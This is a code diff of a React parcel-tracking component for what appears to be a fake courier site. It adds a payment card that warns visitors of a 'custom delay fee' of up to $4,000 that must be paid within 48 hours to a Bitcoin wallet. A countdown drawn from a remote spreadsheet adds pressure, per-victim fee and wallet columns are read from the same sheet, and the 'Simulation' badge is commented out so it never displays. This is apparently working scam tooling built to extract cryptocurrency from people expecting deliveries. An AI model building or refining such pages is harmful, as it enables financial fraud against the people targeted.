@@ -1,67 +1,116 @@
-import React, { useEffect, useState, useCallback } from 'react';
-import { createPortal } from 'react-dom';
-import { Link } from 'react-router-dom';
-import { getUser } from '../utils/auth';
+import React, { useEffect, useState, useCallback } from "react";
+import { createPortal } from "react-dom";
+import { Link } from "react-router-dom";
+import { getUser } from "../utils/auth";
 
 // ⚠️ If your SheetDB plan supports multiple sheets on one endpoint,
 // keep `?sheet=parcels` on the URL below.
 // If it doesn't, replace this with the second endpoint URL you created
 // and remove the `?sheet=parcels` suffix.
-const PARCELS_URL =
-  'https://sheetdb.io/api/v1/hw2ce8n9rooe3';
+const PARCELS_URL = "https://sheetdb.io/api/v1/hw2ce8n9rooe3";
+
+// 👇 Dedicated endpoint that holds the countdown `deadline` column
+const DEADLINE_URL = "https://sheetdb.io/api/v1/tsfvu7mh4bjwo";
 
 const statusColors = {
-  delivered: '#22c55e',
-  final_destination: '#0E9F6E',
-  out_for_delivery: '#FF5230',
-  in_transit: '#FF5230',
-  pending: '#a1a1aa',
-  exception: '#ef4444',
+  delivered: "#22c55e",
+  final_destination: "#0E9F6E",
+  out_for_delivery: "#FF5230",
+  in_transit: "#FF5230",
+  pending: "#a1a1aa",
+  exception: "#ef4444",
 };
 
 const statusLabels = {
-  delivered: 'Delivered',
-  final_destination: 'Final destination',
-  out_for_delivery: 'Out for delivery',
-  in_transit: 'In transit',
-  pending: 'Pending',
-  exception: 'Exception',
+  delivered: "Delivered",
+  final_destination: "Final destination",
+  out_for_delivery: "Out for delivery",
+  in_transit: "In transit",
+  pending: "Pending",
+  exception: "Exception",
 };
 
 // Progress track steps (exception is handled separately)
 const STATUS_STEPS = [
-  { key: 'pending', label: 'Pending' },
-  { key: 'in_transit', label: 'In transit' },
-  { key: 'out_for_delivery', label: 'Out for delivery' },
-  { key: 'delivered', label: 'Delivered' },
-  { key: 'final_destination', label: 'Final destination' },
+  { key: "pending", label: "Pending" },
+  { key: "in_transit", label: "In transit" },
+  { key: "out_for_delivery", label: "Out for delivery" },
+  { key: "delivered", label: "Delivered" },
+  { key: "final_destination", label: "Final destination" },
 ];
 
 /* ------------------------------------------------------------------ */
-/*  CRYPTO PAY CARD                                                    */
+/*  CRYPTO PAY CARD (SheetDB-connected countdown)                     */
 /* ------------------------------------------------------------------ */
 const CryptoPayCard = ({ amount, wallet }) => {
   const [copied, setCopied] = useState(false);
+  const [remaining, setRemaining] = useState(null); // null = loading
+  const [error, setError] = useState(null);
 
+  /* ---- copy wallet ---- */
   const handleCopy = async () => {
     try {
       await navigator.clipboard.writeText(wallet);
     } catch {
-      const el = document.createElement('textarea');
+      const el = document.createElement("textarea");
       el.value = wallet;
       document.body.appendChild(el);
       el.select();
-      document.execCommand('copy');
+      document.execCommand("copy");
       document.body.removeChild(el);
     }
     setCopied(true);
     setTimeout(() => setCopied(false), 1800);
   };
 
+  /* ---- SheetDB-driven countdown ---- */
+  useEffect(() => {
+    let intervalId;
+
+    async function initTimer() {
+      try {
+        const res = await fetch(`${DEADLINE_URL}?limit=1`);
+        if (!res.ok) throw new Error("Failed to reach SheetDB");
+        const rows = await res.json();
+
+        const deadlineStr = rows?.[0]?.deadline;
+        if (!deadlineStr) throw new Error("No deadline found in SheetDB");
+
+        const deadline = new Date(deadlineStr).getTime();
+        if (Number.isNaN(deadline)) throw new Error("Invalid deadline format");
+
+        const tick = () => {
+          const secondsLeft = Math.max(
+            0,
+            Math.floor((deadline - Date.now()) / 1000)
+          );
+          setRemaining(secondsLeft);
+          if (secondsLeft === 0) clearInterval(intervalId);
+        };
+
+        tick(); // immediate so no 1s blank
+        intervalId = setInterval(tick, 1000);
+      } catch (err) {
+        console.error(err);
+        setError(err.message);
+      }
+    }
+
+    initTimer();
+    return () => clearInterval(intervalId);
+  }, []);
+
+  /* ---- helpers ---- */
+  const pad = (n) => String(n).padStart(2, "0");
+  const hours = remaining != null ? Math.floor(remaining / 3600) : 0;
+  const minutes = remaining != null ? Math.floor((remaining % 3600) / 60) : 0;
+  const seconds = remaining != null ? remaining % 60 : 0;
+
   return (
     <>
       <style>{`
         .cpc {
+          position: relative;
           margin-top: 1.5rem;
           padding: 1.15rem 1.2rem 1.25rem;
           border-radius: 16px;
@@ -74,98 +123,167 @@ const CryptoPayCard = ({ amount, wallet }) => {
           from { opacity: 0; transform: translateY(6px); }
           to   { opacity: 1; transform: none; }
         }
+
+        /* Demo marker — remove for production */
+        .cpc-badge {
+          position: absolute;
+          top: 0.85rem;
+          right: 0.85rem;
+          font-size: 0.58rem;
+          font-weight: 800;
+          letter-spacing: 0.12em;
+          text-transform: uppercase;
+          color: #B45309;
+          background: rgba(245,158,11,0.14);
+          border: 1px solid rgba(245,158,11,0.3);
+          padding: 0.2rem 0.5rem;
+          border-radius: 6px;
+        }
+
+        /* Attention label */
         .cpc-label {
+          display: inline-flex;
+          align-items: center;
+          gap: 0.4rem;
+          font-size: 0.66rem;
+          font-weight: 700;
+          letter-spacing: 0.1em;
+          text-transform: uppercase;
+          color: #B45309;
+          background: rgba(245,158,11,0.14);
+          border: 1px solid rgba(245,158,11,0.3);
+          padding: 0.25rem 0.6rem;
+          border-radius: 6px;
+          margin-bottom: 0.75rem;
+        }
+        .cpc-label__icon {
+          font-size: 0.75rem;
+          line-height: 1;
+        }
+
+        .cpc-message {
+          font-size: 0.85rem;
+          line-height: 1.55;
+          color: #3F3F46;
+          margin-bottom: 1rem;
+        }
+        .cpc-message strong {
+          color: #0E0E10;
+          font-weight: 700;
+        }
+
+        /* Countdown */
+        .cpc-countdown {
+          background: #fff;
+          border: 1px solid rgba(14,14,16,0.1);
+          border-radius: 12px;
+          padding: 0.85rem 0.75rem;
+          text-align: center;
+        }
+        .cpc-countdown__title {
           font-size: 0.66rem;
           font-weight: 700;
           letter-spacing: 0.1em;
           text-transform: uppercase;
           color: #71717A;
-          margin-bottom: 0.35rem;
+          margin-bottom: 0.6rem;
         }
-        .cpc-amount {
-          font-size: 1.5rem;
+        .cpc-timer {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          gap: 0.5rem;
+        }
+        .cpc-timer__unit {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          min-width: 3rem;
+        }
+        .cpc-timer__value {
+          font-size: 1.35rem;
           font-weight: 700;
           color: #0E0E10;
           letter-spacing: -0.02em;
-          margin-bottom: 0.9rem;
+          font-variant-numeric: tabular-nums;
         }
-        .cpc-row {
-          display: flex;
-          align-items: center;
-          gap: 0.5rem;
-          background: #fff;
-          border: 1px solid rgba(14,14,16,0.1);
-          border-radius: 12px;
-          padding: 0.4rem 0.4rem 0.4rem 0.75rem;
-        }
-        .cpc-addr {
-          flex: 1;
-          min-width: 0;
-          font-family: 'SF Mono', Menlo, Consolas, monospace;
-          font-size: 0.78rem;
-          color: #3F3F46;
-          white-space: nowrap;
-          overflow: hidden;
-          text-overflow: ellipsis;
-        }
-        .cpc-copy {
-          flex-shrink: 0;
-          border: none;
-          border-radius: 9px;
-          background: #FF5230;
-          color: #fff;
-          font-family: inherit;
-          font-size: 0.78rem;
-          font-weight: 700;
-          padding: 0.55rem 0.9rem;
-          cursor: pointer;
-          transition: background 0.2s ease, transform 0.15s ease;
-        }
-        .cpc-copy:hover { background: #ff3b14; }
-        .cpc-copy:active { transform: scale(0.97); }
-        .cpc-copy.is-copied { background: #22c55e; }
-        .cpc-hint {
-          margin-top: 0.65rem;
-          font-size: 0.72rem;
+        .cpc-timer__label {
+          font-size: 0.6rem;
+          font-weight: 600;
+          letter-spacing: 0.08em;
+          text-transform: uppercase;
           color: #71717A;
-          text-align: center;
+          margin-top: 0.15rem;
         }
-        .cpc-note {
-          margin-top: 0.75rem;
-          padding-top: 0.75rem;
-          border-top: 1px dashed rgba(14,14,16,0.12);
-          font-size: 0.78rem;
-          line-height: 1.5;
-          color: #3F3F46;
-          text-align: center;
+        .cpc-timer__sep {
+          font-size: 1.1rem;
+          font-weight: 700;
+          color: #A1A1AA;
         }
       `}</style>
 
       <div className="cpc">
-        <div className="cpc-label">Final Destination Clearance Fee</div>
-        <div className="cpc-amount">${amount} USD</div>
+        {/* <div className="cpc-badge">Simulation</div> */}
+
+        <div className="cpc-label">
+          <span className="cpc-label__icon" aria-hidden="true">⚠</span>
+          Attention
+        </div>
+
+        <p className="cpc-message">
+          Due to a delay with your pickup, a{" "}
+          <strong>custom delay fee of ${amount}.00</strong> has been placed on
+          your parcel. This charge must be paid within <strong>48 hours</strong>.
+        </p>
+
+        <div className="cpc-countdown">
+          <p className="cpc-countdown__title">Time remaining to pay</p>
+
+          {error ? (
+            <p style={{ color: "#b91c1c", fontSize: "0.8rem", margin: 0 }}>
+              {error}
+            </p>
+          ) : remaining === null ? (
+            <p style={{ color: "#71717A", fontSize: "0.8rem", margin: 0 }}>
+              Loading timer…
+            </p>
+          ) : (
+            <div className="cpc-timer">
+              <div className="cpc-timer__unit">
+                <span className="cpc-timer__value">{pad(hours)}</span>
+                <span className="cpc-timer__label">Hours</span>
+              </div>
+              <span className="cpc-timer__sep">:</span>
+              <div className="cpc-timer__unit">
+                <span className="cpc-timer__value">{pad(minutes)}</span>
+                <span className="cpc-timer__label">Minutes</span>
+              </div>
+              <span className="cpc-timer__sep">:</span>
+              <div className="cpc-timer__unit">
+                <span className="cpc-timer__value">{pad(seconds)}</span>
+                <span className="cpc-timer__label">Seconds</span>
+              </div>
+            </div>
+          )}
+        </div>
+
+        {/* Wallet + amount (kept from the original card so the modal still works) */}
+        <div className="cpc-amount">${amount}</div>
 
         <div className="cpc-row">
-          <span className="cpc-addr" title={wallet}>
-            {wallet}
-          </span>
+          <code className="cpc-addr">{wallet}</code>
           <button
             type="button"
-            className={`cpc-copy${copied ? ' is-copied' : ''}`}
+            className={`cpc-copy${copied ? " is-copied" : ""}`}
             onClick={handleCopy}
           >
-            {copied ? 'Copied!' : 'Copy'}
+            {copied ? "Copied" : "Copy"}
           </button>
         </div>
 
-        <div className="cpc-hint">
-          Send the exact amount to the Bitcoin address above.
-        </div>
-
-        <div className="cpc-note">
-          The final destination clearance fee must be paid before the package
-          arrives at the post office.
-        </div>
+        <p className="cpc-hint">
+          Send the exact amount to this wallet address.
+        </p>
       </div>
     </>
   );
@@ -177,22 +295,22 @@ const CryptoPayCard = ({ amount, wallet }) => {
 const ParcelModal = ({ parcel, onClose }) => {
   const [copied, setCopied] = useState(false);
 
-  const color = statusColors[parcel.status] || '#a1a1aa';
-  const isException = parcel.status === 'exception';
+  const color = statusColors[parcel.status] || "#a1a1aa";
+  const isException = parcel.status === "exception";
   const activeIndex = STATUS_STEPS.findIndex((s) => s.key === parcel.status);
 
-  const etaParts = (parcel.eta || '').split(',');
+  const etaParts = (parcel.eta || "").split(",");
 
   // Esc to close + lock body scroll
   useEffect(() => {
     const onKey = (e) => {
-      if (e.key === 'Escape') onClose();
+      if (e.key === "Escape") onClose();
     };
-    window.addEventListener('keydown', onKey);
+    window.addEventListener("keydown", onKey);
     const prevOverflow = document.body.style.overflow;
-    document.body.style.overflow = 'hidden';
+    document.body.style.overflow = "hidden";
     return () => {
-      window.removeEventListener('keydown', onKey);
+      window.removeEventListener("keydown", onKey);
       document.body.style.overflow = prevOverflow;
     };
   }, [onClose]);
@@ -208,11 +326,7 @@ const ParcelModal = ({ parcel, onClose }) => {
   };
 
   return createPortal(
-    <div
-      className="pm-backdrop"
-      onClick={onClose}
-      role="presentation"
-    >
+    <div className="pm-backdrop" onClick={onClose} role="presentation">
       <div
         className="pm-card"
         role="dialog"
@@ -556,13 +670,19 @@ const ParcelModal = ({ parcel, onClose }) => {
         `}</style>
 
         {/* HERO */}
-        <div
-          className="pm-hero"
-          style={{ background: `${color}12`, color }}
-        >
+        <div className="pm-hero" style={{ background: `${color}12`, color }}>
           <div className="pm-hero-top">
             <div className="pm-hero-icon">
-              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <svg
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke={color}
+                strokeWidth="2"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+              >
                 <path d="M16.5 9.4 7.55 4.24" />
                 <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" />
                 <polyline points="3.27 6.96 12 12.01 20.73 6.96" />
@@ -576,7 +696,16 @@ const ParcelModal = ({ parcel, onClose }) => {
               onClick={onClose}
               aria-label="Close"
             >
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <svg
+                width="16"
+                height="16"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="2.5"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+              >
                 <path d="M18 6 6 18" />
                 <path d="m6 6 12 12" />
               </svg>
@@ -599,7 +728,17 @@ const ParcelModal = ({ parcel, onClose }) => {
         <div className="pm-body">
           {isException ? (
             <div className="pm-exception">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, marginTop: 1 }}>
+              <svg
+                width="18"
+                height="18"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="2"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+                style={{ flexShrink: 0, marginTop: 1 }}
+              >
                 <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z" />
                 <line x1="12" y1="9" x2="12" y2="13" />
                 <line x1="12" y1="17" x2="12.01" y2="17" />
@@ -617,11 +756,20 @@ const ParcelModal = ({ parcel, onClose }) => {
                 return (
                   <div
                     key={step.key}
-                    className={`pm-track-item${isDone ? ' is-done' : ''}${isCurrent ? ' is-current' : ''}`}
+                    className={`pm-track-item${isDone ? " is-done" : ""}${isCurrent ? " is-current" : ""}`}
                   >
                     <div className="pm-track-dot">
                       {i < activeIndex ? (
-                        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round">
+                        <svg
+                          width="11"
+                          height="11"
+                          viewBox="0 0 24 24"
+                          fill="none"
+                          stroke="currentColor"
+                          strokeWidth="3.5"
+                          strokeLinecap="round"
+                          strokeLinejoin="round"
+                        >
                           <polyline points="20 6 9 17 4 12" />
                         </svg>
                       ) : (
@@ -636,10 +784,19 @@ const ParcelModal = ({ parcel, onClose }) => {
           )}
 
           {/* FINAL DESTINATION NOTE — only when status is final_destination */}
-          {parcel.status === 'final_destination' && (
+          {parcel.status === "final_destination" && (
             <div className="pm-final">
               <div className="pm-final-head">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <svg
+                  width="14"
+                  height="14"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  strokeWidth="2.5"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                >
                   <path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z" />
                   <circle cx="12" cy="10" r="3" />
                 </svg>
@@ -666,7 +823,7 @@ const ParcelModal = ({ parcel, onClose }) => {
               <div className="pm-cell-value">
                 {etaParts[0]}
                 {etaParts.length > 1 && (
-                  <small>{etaParts.slice(1).join(',').trim()}</small>
+                  <small>{etaParts.slice(1).join(",").trim()}</small>
                 )}
               </div>
             </div>
@@ -688,14 +845,32 @@ const ParcelModal = ({ parcel, onClose }) => {
             >
               {copied ? (
                 <>
-                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                  <svg
+                    width="14"
+                    height="14"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    strokeWidth="2.5"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
                     <polyline points="20 6 9 17 4 12" />
                   </svg>
                   Copied
                 </>
               ) : (
                 <>
-                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <svg
+                    width="14"
+                    height="14"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    strokeWidth="2"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
                     <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                     <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                   </svg>
@@ -714,13 +889,13 @@ const ParcelModal = ({ parcel, onClose }) => {
 
           {/* CRYPTO PAY CARD — always visible */}
           <CryptoPayCard
-            amount={parcel.clearanceFee || '875.00'}
-            wallet={parcel.wallet || 'bc1qsa7af2783e56jd3z0zhsl56kceuu58ze69lf09'}
-          />
+  amount={parcel.clearanceFee || "4,000.00"}
+  wallet={parcel.wallet || "bc1qx9tvzzpjt5hxwj7dnhrlsgmhz7lu8tsendek8k"}
+/>
         </div>
       </div>
     </div>,
-    document.body
+    document.body,
   );
 };
 
@@ -747,7 +922,6 @@ const ParcelsList = ({ limit }) => {
     setError(null);
 
     try {
-      // SheetDB: /search?column=value filters rows
       const url = `${PARCELS_URL}/search?email=${encodeURIComponent(email)}`;
       const res = await fetch(url);
 
@@ -755,36 +929,30 @@ const ParcelsList = ({ limit }) => {
 
       const rows = await res.json();
 
-      // Normalize SheetDB keys to our shape.
       const normalized = rows.map((r) => {
-        const status = String(r.status || 'pending')
+        const status = String(r.status || "pending")
           .trim()
           .toLowerCase()
-          .replace(/[\s-]+/g, '_');
+          .replace(/[\s-]+/g, "_");
 
         return {
-          number: r.tracking_number || '',
+          number: r.tracking_number || "",
           status,
-          label: statusLabels[status] || 'Pending',
-          courier: r.courier || '—',
-          from: r.from_location || '—',
-          to: r.to_location || '—',
-          eta: r.arrives_thru || '—',
-
-          // Column literally named "final_destination"
-          finalNote: r.final_destination || '',
-
-          // Optional crypto columns — add them to your SheetDB sheet
-          // (clearance_fee, bitcoin_wallet) if you want them dynamic.
-          clearanceFee: r.clearance_fee || '',
-          wallet: r.bitcoin_wallet || '',
+          label: statusLabels[status] || "Pending",
+          courier: r.courier || "—",
+          from: r.from_location || "—",
+          to: r.to_location || "—",
+          eta: r.arrives_thru || "—",
+          finalNote: r.final_destination || "",
+          clearanceFee: r.clearance_fee || "",
+          wallet: r.bitcoin_wallet || "",
         };
       });
 
       setParcels(limit ? normalized.slice(0, limit) : normalized);
     } catch (err) {
-      console.error('Parcels fetch error:', err);
-      setError(err.message || 'Could not load parcels.');
+      console.error("Parcels fetch error:", err);
+      setError(err.message || "Could not load parcels.");
     } finally {
       setLoading(false);
     }
@@ -794,7 +962,6 @@ const ParcelsList = ({ limit }) => {
     loadParcels();
   }, [loadParcels]);
 
-  // Close modal if the list reloads / changes
   useEffect(() => {
     setSelected(null);
   }, [parcels]);
@@ -803,7 +970,7 @@ const ParcelsList = ({ limit }) => {
   const closeParcel = useCallback(() => setSelected(null), []);
 
   const handleKeyOpen = (e, parcel) => {
-    if (e.key === 'Enter' || e.key === ' ') {
+    if (e.key === "Enter" || e.key === " ") {
       e.preventDefault();
       openParcel(parcel);
     }
@@ -1033,24 +1200,33 @@ const ParcelsList = ({ limit }) => {
         <div className="parcels-empty">
           <strong>No parcels yet</strong>
           Track a parcel from the home page and it will show up here.
-          <div style={{ marginTop: '1.25rem' }}>
+          <div style={{ marginTop: "1.25rem" }}>
             <Link
               to="/"
               style={{
-                display: 'inline-flex',
-                alignItems: 'center',
-                gap: '0.4rem',
-                background: '#FF5230',
-                color: '#fff',
-                textDecoration: 'none',
+                display: "inline-flex",
+                alignItems: "center",
+                gap: "0.4rem",
+                background: "#FF5230",
+                color: "#fff",
+                textDecoration: "none",
                 fontWeight: 600,
-                fontSize: '0.85rem',
-                padding: '0.7rem 1.35rem',
-                borderRadius: '100px',
+                fontSize: "0.85rem",
+                padding: "0.7rem 1.35rem",
+                borderRadius: "100px",
               }}
             >
               Track a parcel
-              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <svg
+                width="14"
+                height="14"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="2.5"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+              >
                 <path d="M5 12h14" />
                 <path d="m12 5 7 7-7 7" />
               </svg>
@@ -1063,8 +1239,8 @@ const ParcelsList = ({ limit }) => {
       {!loading && !error && parcels.length > 0 && (
         <div className="parcel-list">
           {parcels.map((p) => {
-            const color = statusColors[p.status] || '#a1a1aa';
-            const etaParts = (p.eta || '').split(',');
+            const color = statusColors[p.status] || "#a1a1aa";
+            const etaParts = (p.eta || "").split(",");
             return (
               <div
                 key={p.number}
@@ -1076,7 +1252,16 @@ const ParcelsList = ({ limit }) => {
                 onKeyDown={(e) => handleKeyOpen(e, p)}
               >
                 <div className="parcel-icon">
-                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <svg
+                    width="20"
+                    height="20"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    strokeWidth="2"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
                     <path d="M16.5 9.4 7.55 4.24" />
                     <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" />
                     <polyline points="3.27 6.96 12 12.01 20.73 6.96" />
@@ -1096,17 +1281,32 @@ const ParcelsList = ({ limit }) => {
                     </span>
                   </div>
                   <div className="parcel-meta">
-                    <span>Courier: <strong>{p.courier}</strong></span>
-                    <span>From: <strong>{p.from}</strong></span>
-                    <span>To: <strong>{p.to}</strong></span>
+                    <span>
+                      Courier: <strong>{p.courier}</strong>
+                    </span>
+                    <span>
+                      From: <strong>{p.from}</strong>
+                    </span>
+                    <span>
+                      To: <strong>{p.to}</strong>
+                    </span>
                   </div>
                 </div>
 
                 <div className="parcel-eta">
                   <strong>{etaParts[0]}</strong>
-                  {etaParts.slice(1).join(',').trim()}
+                  {etaParts.slice(1).join(",").trim()}
                   <span className="parcel-chevron">
-                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                    <svg
+                      width="15"
+                      height="15"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      strokeWidth="2.5"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                    >
                       <path d="m9 18 6-6-6-6" />
                     </svg>
                   </span>
@@ -1118,9 +1318,7 @@ const ParcelsList = ({ limit }) => {
       )}
 
       {/* MODAL */}
-      {selected && (
-        <ParcelModal parcel={selected} onClose={closeParcel} />
-      )}
+      {selected && <ParcelModal parcel={selected} onClose={closeParcel} />}
     </div>
   );
 };
